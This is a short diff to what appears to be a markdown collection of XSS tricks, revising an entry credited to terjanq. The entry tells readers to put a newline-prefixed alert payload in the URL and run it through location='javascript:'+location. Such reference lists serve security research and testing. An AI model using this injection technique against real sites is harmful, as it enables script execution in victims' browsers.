@@ -200,7 +200,7 @@ Only IE [matt](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-pare
 
 [terjanq](https://twitter.com/terjanq)
 
-Put `#%0aalert(/1337/)//` or `?%0aalert(/1337/)//` or `&%0aalert(/1337/)` anywhere in the URL. Then, arbitrary code can be executed via:
+Put `%0aalert(/1337/)//` anywhere in the URL. Then, arbitrary code can be executed via:
 
 ```js
 location='javascript:'+location
